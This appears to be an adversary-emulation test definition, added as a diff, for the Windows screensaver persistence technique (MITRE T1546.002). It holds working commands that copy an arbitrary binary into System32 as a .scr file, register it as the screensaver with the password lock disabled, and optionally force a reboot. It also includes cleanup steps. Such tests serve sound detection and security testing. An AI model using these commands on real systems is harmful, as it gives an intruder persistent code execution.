@@ -1,0 +1,40 @@
+api_version: "2.0"
+name: Set Arbitrary Binary as Screensaver
+description: |
+    This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.
+args:
+    - name: input_binary
+      type: path
+      default: C:\Windows\System32\cmd.exe
+    - name: reboot
+      type: int
+      default: "0"
+uuid: 281201e7-de41-4dc9-b73d-f288938cbb64
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+    subtechniques:
+        - 'T1546.002: Screensaver'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: set-arbitrary-binary-as-screensaver
+      inline: |
+        reg export "HKEY_CURRENT_USER\Control Panel\Desktop" %userprofile%\backup.reg
+        copy {{.Args.input_binary}} "%SystemRoot%\System32\evilscreensaver.scr"
+        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
+        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
+        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
+        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
+        if {{.Args.reboot}} NEQ 0 shutdown /r /t 0
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg import %userprofile%\backup.reg
+            del %userprofile%\backup.reg
+            del %SystemRoot%\System32\evilscreensaver.scr
+        executor: command_prompt
